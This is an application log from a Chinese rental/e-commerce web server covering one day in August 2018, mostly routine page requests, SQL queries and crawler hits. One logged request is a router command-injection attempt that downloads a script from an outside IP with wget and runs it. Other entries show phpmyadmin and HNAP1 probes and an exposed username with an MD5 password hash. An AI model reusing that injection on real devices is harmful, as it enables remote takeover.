[ 2018-08-02T01:05:00+08:00 ] 221.220.174.60 /Index/weizhi.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000240s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000427s ]

[ 2018-08-02T01:05:13+08:00 ] 221.220.174.60 /Cart/ajaxFcuntion.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000238s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000406s ]
SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0006s ]
SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '27'  [ RunTime:0.0004s ]

[ 2018-08-02T01:05:20+08:00 ] 221.220.174.60 /Tourist/dologin.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000385s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000624s ]
SQL: SHOW COLUMNS FROM `plgox_member` [ RunTime:0.0006s ]
SQL: SELECT * FROM `plgox_member` WHERE (  `plgox_user` = 'wenyu1995' OR `plgox_tel` = 'wenyu1995' ) AND `plgox_pwd` = '21232f297a57a5a743894a0e4a801fc3' AND `plgox_usertype` IN ('3','4') LIMIT 1   [ RunTime:0.0004s ]
SQL: UPDATE `plgox_member` SET `plgox_logintime`='1533143120' WHERE `plgox_id` = 150 [ RunTime:0.0133s ]
SQL: UPDATE `plgox_member` SET `plgox_loginumer`=plgox_loginumer+1 WHERE `plgox_id` = 150 [ RunTime:0.0124s ]

[ 2018-08-02T01:05:22+08:00 ] 221.220.174.60 /Tourist/loginout.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000251s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000428s ]

[ 2018-08-02T01:05:29+08:00 ] 221.220.174.60 /Index/weizhi.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000315s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000523s ]

[ 2018-08-02T01:09:29+08:00 ] 83.235.171.95 /cgi-bin/luci/;stok=redacted/expert/maintenance/diagnostic/nslookup?nslookup_button=nslookup_button&ping_ip=google.ca%20%3B%20cd%20/tmp%3Bwget%20http://178.128.11.199/rvs%20-O%20/tmp/rz%3Bchmod%20777%20/tmp/rz%3Bsh%20/tmp/rz%20
ERR: 无法加载控制器:Cgi-bin

[ 2018-08-02T01:10:48+08:00 ] 221.220.174.60 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000367s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000635s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0007s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 164  [ RunTime:0.0003s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 164  [ RunTime:0.0002s ]
NOTIC: [8] Undefined offset: 0 /home/application/www.plgox.com/Application/Home/Controller/HomeuserController.class.php 第 739 行.
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = null  [ RunTime:0.0002s ]

[ 2018-08-02T01:11:01+08:00 ] 221.220.174.60 /phpmyadmin/
ERR: 无法加载控制器:Phpmyadmin

[ 2018-08-02T01:11:02+08:00 ] 221.220.174.60 /phpmyadmin/
ERR: 无法加载控制器:Phpmyadmin

[ 2018-08-02T01:21:01+08:00 ] 203.208.60.139 /Index/list1?content=&type=2
ERR: 非法操作:list1

[ 2018-08-02T01:57:37+08:00 ] 203.208.60.126 /Cart/ajaxFcuntion.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000303s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000474s ]
SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0006s ]
SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '52'  [ RunTime:0.0005s ]

[ 2018-08-02T02:32:39+08:00 ] 203.208.60.52 /index/anli_detail/id/2.html
ERR: 非法操作:anli_detail

[ 2018-08-02T02:37:29+08:00 ] 203.208.60.143 /share/share_detail/id/41.html
ERR: 无法加载控制器:Share

[ 2018-08-02T03:37:50+08:00 ] 47.98.62.203 /phpmyadmin
ERR: 无法加载控制器:Phpmyadmin

[ 2018-08-02T04:34:58+08:00 ] 203.208.60.77 /robots.txt
ERR: 无法加载控制器:Robots.txt

[ 2018-08-02T04:55:28+08:00 ] 203.208.60.218 /robots.txt
ERR: 无法加载控制器:Robots.txt

[ 2018-08-02T06:30:36+08:00 ] 54.36.150.76 /robots.txt
ERR: 无法加载控制器:Robots.txt

[ 2018-08-02T07:02:53+08:00 ] 203.208.60.122 /Cart/ajaxFcuntion.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000311s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000546s ]
SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0006s ]
SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '45'  [ RunTime:0.0004s ]

[ 2018-08-02T07:34:03+08:00 ] 203.208.60.95 /Cart/ajaxFcuntion.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000245s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000421s ]
SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0006s ]
SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '30'  [ RunTime:0.0003s ]

[ 2018-08-02T07:39:24+08:00 ] 203.208.60.141 /Cart/ajaxFcuntion.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000343s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000571s ]
SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0008s ]
SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '34'  [ RunTime:0.0004s ]

[ 2018-08-02T08:18:54+08:00 ] 220.181.125.177 /robots.txt
ERR: 无法加载控制器:Robots.txt

[ 2018-08-02T08:44:33+08:00 ] 217.71.236.216 /HNAP1/
ERR: 无法加载控制器:HNAP1

[ 2018-08-02T08:53:24+08:00 ] 111.206.221.24 /Index/weizhi.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000347s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000599s ]

[ 2018-08-02T09:03:57+08:00 ] 114.254.142.166 /Index/weizhi.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000267s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000447s ]

[ 2018-08-02T09:04:11+08:00 ] 114.254.142.166 /Index/weizhi.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000368s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000691s ]

[ 2018-08-02T09:20:03+08:00 ] 203.208.60.38 /Cart/ajaxFcuntion.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000272s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000481s ]
SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0006s ]
SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '52'  [ RunTime:0.0004s ]

[ 2018-08-02T10:05:46+08:00 ] 220.181.108.102 /Application/Common/Common/duanxin
ERR: 无法加载控制器:Application

[ 2018-08-02T11:44:56+08:00 ] 203.208.60.98 /Cart/ajaxFcuntion.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000358s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000629s ]
SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0006s ]
SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '31'  [ RunTime:0.0003s ]

[ 2018-08-02T12:41:50+08:00 ] 114.254.142.166 /Cart/ajaxFcuntion.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000269s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000447s ]
SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0006s ]
SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '27'  [ RunTime:0.0003s ]

[ 2018-08-02T12:42:19+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000263s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000430s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0005s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 91  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 91  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 92  [ RunTime:0.0001s ]

[ 2018-08-02T12:42:34+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000261s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000455s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0005s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 105  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 105  [ RunTime:0.0001s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 106  [ RunTime:0.0001s ]

[ 2018-08-02T12:42:34+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000445s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000725s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0005s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 105  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 105  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 106  [ RunTime:0.0001s ]

[ 2018-08-02T12:42:34+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000240s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000435s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0006s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 101  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 101  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 102  [ RunTime:0.0001s ]

[ 2018-08-02T12:42:34+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000353s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000601s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0006s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 91  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 91  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 92  [ RunTime:0.0001s ]

[ 2018-08-02T12:42:34+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000396s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000638s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0005s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 82  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 82  [ RunTime:0.0001s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 117  [ RunTime:0.0002s ]

[ 2018-08-02T12:42:36+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000253s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000428s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0005s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 117  [ RunTime:0.0002s ]

[ 2018-08-02T12:42:45+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000321s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000556s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0005s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 82  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 82  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 117  [ RunTime:0.0001s ]

[ 2018-08-02T12:42:45+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001312s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001487s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0005s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 91  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 91  [ RunTime:0.0001s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 92  [ RunTime:0.0002s ]

[ 2018-08-02T12:42:46+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000262s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000432s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0006s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 101  [ RunTime:0.0003s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 101  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 102  [ RunTime:0.0002s ]

[ 2018-08-02T12:42:46+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000248s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000427s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0005s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 105  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 105  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 106  [ RunTime:0.0002s ]

[ 2018-08-02T12:42:46+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000311s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000571s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0005s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 101  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 101  [ RunTime:0.0001s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 102  [ RunTime:0.0002s ]

[ 2018-08-02T12:42:47+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000238s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000406s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0005s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 102  [ RunTime:0.0002s ]

[ 2018-08-02T12:42:55+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000257s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000447s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0005s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 82  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 82  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 117  [ RunTime:0.0001s ]

[ 2018-08-02T12:43:08+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000262s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000458s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0007s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 82  [ RunTime:0.0003s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 82  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 117  [ RunTime:0.0002s ]

[ 2018-08-02T12:43:16+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000256s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000435s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0006s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 101  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 101  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 102  [ RunTime:0.0001s ]

[ 2018-08-02T12:43:23+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000258s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000458s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0005s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 101  [ RunTime:0.0003s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 101  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 102  [ RunTime:0.0001s ]

[ 2018-08-02T12:44:11+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000243s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000413s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0006s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 101  [ RunTime:0.0003s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 101  [ RunTime:0.0002s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 102  [ RunTime:0.0002s ]

[ 2018-08-02T12:44:12+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000248s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000452s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0006s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 165  [ RunTime:0.0003s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 165  [ RunTime:0.0001s ]
NOTIC: [8] Undefined offset: 0 /home/application/www.plgox.com/Application/Home/Controller/HomeuserController.class.php 第 739 行.
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = null  [ RunTime:0.0001s ]

[ 2018-08-02T12:44:12+08:00 ] 114.254.142.166 /Homeuser/fu_zfl.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000307s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000497s ]
SQL: SHOW COLUMNS FROM `plgox_classify` [ RunTime:0.0005s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 164  [ RunTime:0.0003s ]
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = 164  [ RunTime:0.0002s ]
NOTIC: [8] Undefined offset: 0 /home/application/www.plgox.com/Application/Home/Controller/HomeuserController.class.php 第 739 行.
SQL: SELECT * FROM `plgox_classify` WHERE `classify_pid` = null  [ RunTime:0.0002s ]

[ 2018-08-02T13:07:14+08:00 ] 157.55.39.25 /robots.txt
ERR: 无法加载控制器:Robots.txt

[ 2018-08-02T16:19:37+08:00 ] 106.38.241.150 /robots.txt
ERR: 无法加载控制器:Robots.txt

[ 2018-08-02T16:37:37+08:00 ] 203.208.60.61 /robots.txt
ERR: 无法加载控制器:Robots.txt

[ 2018-08-02T16:48:03+08:00 ] 111.206.198.80 /Index/weizhi.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000292s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000500s ]

[ 2018-08-02T17:05:23+08:00 ] 123.207.14.151 /webdav/
ERR: 无法加载控制器:Webdav

[ 2018-08-02T17:23:15+08:00 ] 203.208.60.218 /robots.txt
ERR: 无法加载控制器:Robots.txt

[ 2018-08-02T17:23:17+08:00 ] 203.208.60.218 /Cart/ajaxFcuntion.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000344s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000525s ]
SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0006s ]
SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '52'  [ RunTime:0.0005s ]

[ 2018-08-02T21:51:34+08:00 ] 207.46.13.203 /robots.txt
ERR: 无法加载控制器:Robots.txt

[ 2018-08-02T22:52:46+08:00 ] 207.46.13.61 /robots.txt
ERR: 无法加载控制器:Robots.txt

